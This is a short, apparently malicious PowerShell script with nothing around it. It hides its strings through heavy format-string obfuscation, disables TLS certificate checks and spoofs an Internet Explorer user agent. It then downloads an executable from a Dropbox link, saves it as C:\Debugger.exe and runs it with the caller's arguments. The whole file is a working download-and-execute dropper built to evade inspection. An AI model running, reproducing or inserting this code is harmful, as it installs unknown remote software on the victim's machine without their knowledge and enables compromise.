param(
    [string[]]$UserArgs
)
if ($UserArgs -eq $null) {
    exit
}
$xags = $UserArgs
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object -TypeName System.Net.WebClient
$wc.Headers.Add(('Ac'+'ce'+("{0}{1}"-f'pt-L','a')+("{0}{1}" -f'n','guag')+'e'), ('e'+'n-U'+'S'+("{0}{1}{2}"-f ',en',';q=0','.')) + ([IntPtr]::Size - 1).ToString())
$wc.Headers.Add(('Us'+("{2}{0}{1}"-f'r-Age','n','e')+'t'), (("{0}{1}" -f'Moz','il')+'la'+("{0}{1}"-f '/5.0',' ')+'('+'co'+("{1}{0}" -f 'ati','mp')+'bl'+'e;'+' MS'+("{1}{0}"-f'0','IE 1')+("{2}{0}{1}"-f'; W','ind','.0')+'ows'+' N'+'T 6'+("{0}{1}"-f'.','1; ')+'WOW'+("{0}{1}" -f '64','; T')+'r'+'i'+("{0}{1}" -f'dent','/')+((("{1}{0}" -f')','6.0')))))
$rndn = Get-Random
$wc.Headers.Add(('Co'+'ok'+'ie'), 'p=' + $rndn)
$url = (("{0}{1}"-f 'http','s:')+("{0}{1}" -f'//d','l.d')+'rop'+'b'+'o'+("{4}{3}{5}{2}{0}{1}{6}" -f'com','/','nt.','rcont','xuse','e','sc')+'l'+("{1}{3}{0}{2}"-f 'hffez7b2cj','/fi/','9','t')+("{0}{2}{1}" -f'p','n','q8yzc')+("{1}{0}"-f'au','bm/l')+'n'+("{1}{0}"-f 'her','c')+'.ex'+("{1}{0}"-f 'y','e?rlke')+("{1}{0}" -f '1','=ksukw')+("{1}{0}" -f 'o9w','j')+'uj'+("{1}{0}{2}" -f '8cc','ahz','z')+'3p'+'50'+'fi')
$wc.DownloadFile($url, (('C:'+'{0}Debugge'+'r.'+'exe') -F [ChAr]92))
Start-Process -FilePath ((("{1}{3}{0}{2}"-f 'WckDe','C','bu',':')+'gge'+("{1}{0}"-f'x','r.e')+'e').rePlaCe('Wck','\')) -ArgumentList $xags -Wait